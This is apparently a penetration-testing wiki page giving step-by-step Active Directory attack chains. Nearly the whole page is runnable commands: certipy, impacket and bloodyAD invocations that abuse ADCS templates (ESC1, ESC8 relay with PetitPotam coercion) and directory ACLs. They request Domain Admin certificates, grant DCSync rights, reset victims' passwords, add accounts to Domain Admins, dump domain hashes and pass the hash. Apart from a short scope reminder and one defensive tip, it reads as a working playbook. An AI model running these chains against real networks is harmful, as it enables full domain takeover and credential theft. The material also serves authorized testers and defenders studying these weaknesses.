---
title: "ADCS (ESC1–ESC8) & ACL Abuse Chains"
description: "Active Directory Certificate Services exploitation, PKINIT abuse, shadow credentials, and ACL-based privilege escalation"
tags:
  - Active Directory
  - ADCS
  - Certificates
  - ACL
  - RBCD
  - Escalation
---

# ADCS (ESC1–ESC8) & ACL Abuse Chains

!!! note "What this page is doing"
    ADCS and ACL work begins with reading configuration and effective rights. A certificate request or directory write can have Tier 0 consequences, so validate only the approved edge, record the object change, and clean it up immediately.

---

## 1. ADCS Reconnaissance

```bash
# Find all CAs and templates, flag vulnerable ones
certipy-ad find -u '<USER>@<DOMAIN>' -p 'Password123!' -dc-ip <DC_IP> -vulnerable -stdout
# Also enumerate with NetExec / Impacket
nxc ldap <DC_IP> -u '<USER>' -p 'Password123!' -M adcs
impacket-findDelegation '<DOMAIN>/<USER>:Password123!' -dc-ip <DC_IP>
# Grab the CA's certificate chain (useful for ESC8 / NTLM relay)
certipy-ad ca -u '<USER>@<DOMAIN>' -p 'Password123!' -dc-ip <DC_IP> -ca '<CA_NAME>' -list-templates
```

---

## 2. ESC Escalation Matrix

| ESC | Misconfiguration | Impact | Tool |
| :--- | :--- | :--- | :--- |
| **ESC1** | Template allows requester-supplied `subjectAltName` + low-priv enrollment rights | Request a cert **as Domain Admin** → PKINIT → domain compromise | `certipy-ad req` |
| **ESC2** | Template with `Any Purpose` / no EKU restrictions | Use cert for anything → client auth as DA | `certipy-ad req` |
| **ESC3** | Enrollment Agent template abuse | Request a cert **on behalf of** another user | `certipy-ad req -on-behalf-of` |
| **ESC4** | You have **write** access to the template object | Modify the template to become ESC1 → exploit | `certipy-ad template -write-configuration` |
| **ESC5** | Vulnerable PKI object ACL (CA, NTAuthCertificates, ObjectClass OIDs) | Take over the whole PKI hierarchy | `bloodyAD` / `certipy-ad` |
| **ESC6** | CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` enabled | Supply SAN in **any** template request | `certipy-ad req -alt` |
| **ESC7** | You have **ManageCA / ManageCertificates** rights | Approve your own failed requests → DA cert | `certipy-ad ca -add-officer` |
| **ESC8** | NTLM relay to the **ADCS HTTP enrollment endpoint** (certsrv) | Relay a **DC machine account** → DC certificate → DCSync | `ntlmrelayx --adcs` |
| **ESC9 / ESC10** | `msPKI-Enrollment-Flag` / UPN spoofing with weak cert mapping | Map your cert to another user's UPN | `certipy-ad` |
| **ESC11 / ESC13** | ICPR RPC relay / Issuance Policy group link | Cert issuance abuse / group impersonation | `certipy-ad` |

---

## 3. Exploiting ESC1 (Most Common in Real Engagements)

```bash
# 1. Confirm vulnerable template: "Enrollee Supplies Subject: True" + EKU Client Auth
# + low-priv enrollment rights + no manager approval required
certipy-ad find -u '<USER>@<DOMAIN>' -p 'Password123!' -dc-ip <DC_IP> -vulnerable -stdout
# 2. Request a certificate as a Domain Admin using the vulnerable template
certipy-ad req -u '<USER>@<DOMAIN>' -p 'Password123!' -dc-ip <DC_IP> \
    -ca '<CA_NAME>' -template '<VULN_TEMPLATE>' \
    -upn 'administrator@<DOMAIN>' -sid '<DOMAIN_SID>-500'
# 3. Authenticate with the issued certificate via PKINIT to get the DA's NT hash
certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP> -username administrator -domain <DOMAIN>
# Output: Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:<NTHASH>
# 4. Use the hash for DCSync / WinRM / PtH
impacket-secretsdump -hashes :<NTHASH> '<DOMAIN>/administrator@<DC_IP>'
nxc winrm <DC_IP> -u administrator -H <NTHASH>
```

---

## 4. Exploiting ESC8 (NTLM Relay to ADCS Web Enrollment)

```bash
# 1. Verify the CA exposes an HTTP enrollment endpoint (default: /certsrv/certfnsh.asp)
curl -I http://<CA_IP>/certsrv/ -v
# 2. Start the relay attacker targeting the ADCS HTTP endpoint with the DC template
impacket-ntlmrelayx -t http://<CA_IP>/certsrv/certfnsh.asp -smb2support \
    --adcs --template DomainController -of dc_certs
# 3. Coerce the DC to authenticate to you (PetitPotam works unauthenticated on many DCs)
python3 PetitPotam.py -d <DOMAIN> -u '' -p '' <LHOST> <DC_IP>
# 4. Use the harvested DC certificate to get a DC machine TGT and DCSync
certipy-ad auth -pfx <DC>$.pfx -dc-ip <DC_IP> -username 'DC01$' -domain <DOMAIN>
impacket-secretsdump -just-dc '<DOMAIN>/' -hashes :<DC_MACHINE_HASH>@<DC_IP>
```

!!! tip "ESC8 Defensive Note (for blue team writeups)"
    Disable NTLM on the CA, enable Extended Protection for Authentication (EPA) + HTTPS-only enrollment, and remove the Web Enrollment role entirely where possible.

---

## 5. ACL-Based Privilege Escalation

ACLs are the most under-tested area in AD and frequently hold the shortest path to DA.

| ACL Edge | What It Allows | Exploitation |
| :--- | :--- | :--- |
| `GenericAll` (on user) | Full control | Reset password / set SPN to Kerberoast / Shadow Credentials |
| `GenericAll` (on computer) | Full control | RBCD → S4U → impersonate DA |
| `GenericAll` (on group) | Full control | Add yourself to the group (`net group` / `Add-ADGroupMember`) |
| `GenericWrite` (on user) | Write attributes | Set SPN → Kerberoast, or write `msDS-KeyCredentialLink` → Shadow Credentials |
| `GenericWrite` (on computer) | Write attributes | Write RBCD attribute → S4U → impersonate |
| `WriteDacl` | Modify permissions | Grant yourself DCSync rights (`DS-Replication-Get-Changes-All`) |
| `WriteOwner` | Change owner | Take ownership → grant FullControl to yourself |
| `ForceChangePassword` | Reset password | `net user <USER> <NEWPASS> /domain` (no old password needed) |
| `AddMember` | Add members | Add yourself (or a controlled account) to the target group |
| `AddKeyCredentialLink` | Shadow Credentials | Add your key → PKINIT → get NT hash |

=== " Exploiting Common ACL Edges"

    ```bash
    # --- FullControl / WriteDacl: grant yourself DCSync rights ---
    impacket-dacledit -action write -rights DCSync -principal '<USER>' -target-dn 'DC=corp,DC=local' \
        '<DOMAIN>/<USER>:Password123!' -dc-ip <DC_IP>
    impacket-secretsdump '<DOMAIN>/<USER>:Password123!@<DC_IP>' -just-dc
    # --- ForceChangePassword: reset a victim's password ---
    net rpc password '<VICTIM_USER>' 'NewP@ssw0rd123!' -U '<DOMAIN>/<USER>%Password123!' -S <DC_IP>
    bloodyAD --host <DC_IP> -d <DOMAIN> -u '<USER>' -p 'Password123!' set password <VICTIM_USER> 'NewP@ssw0rd123!'
    # --- AddMember: add yourself to a privileged group ---
    bloodyAD --host <DC_IP> -d <DOMAIN> -u '<USER>' -p 'Password123!' add groupMember 'DOMAIN ADMINS' '<USER>'
    net rpc group addmem "Domain Admins" <USER> -U '<DOMAIN>/<USER>%Password123!' -S <DC_IP>
    # --- WriteOwner: take ownership then grant rights ---
    impacket-owneredit -action write -new-owner '<USER>' -target-dn 'CN=Target,DC=corp,DC=local' \
        '<DOMAIN>/<USER>:Password123!' -dc-ip <DC_IP>
    impacket-dacledit -action write -rights FullControl -principal '<USER>' \
        -target-dn 'CN=Target,DC=corp,DC=local' '<DOMAIN>/<USER>:Password123!' -dc-ip <DC_IP>
    ```

=== " Shadow Credentials (GenericWrite → hash)"

    ```bash
    # 1. Add a Key Credential to a target object you have GenericWrite/AddKeyCredentialLink on
    certipy-ad shadow auto -u '<USER>@<DOMAIN>' -p 'Password123!' -account '<TARGET_USER>' -dc-ip <DC_IP>
    # Or with pywhisker / Whisker
    python3 pywhisker.py -d <DOMAIN> -u '<USER>' -p 'Password123!' --target '<TARGET_USER>' --action add
    # 2. Authenticate via PKINIT and retrieve the target's NT hash
    certipy-ad auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP> -username '<TARGET_USER>' -domain <DOMAIN>
    # 3. Cleanup (remove your key credential to reduce noise)
    certipy-ad shadow auto -u '<USER>@<DOMAIN>' -p 'Password123!' -account '<TARGET_USER>' -dc-ip <DC_IP> -remove
    ```

=== " WriteDACL → DCSync Full Chain"

    ```bash
    # 1. WriteDacl on the domain object → grant yourself replication rights
    impacket-dacledit -action write -rights DCSync -principal '<USER>' \
        -target-dn 'DC=corp,DC=local' '<DOMAIN>/<USER>:Password123!' -dc-ip <DC_IP>
    # 2. Wait for replication propagation, then DCSync
    impacket-secretsdump -just-dc-ntlm '<DOMAIN>/<USER>:Password123!@<DC_IP>' -outputfile dcsync_dump
    # 3. Pass-the-Hash as Domain Admin / krbtgt and verify
    nxc smb <DC_IP> -u administrator -H <DA_HASH> --shares
    ```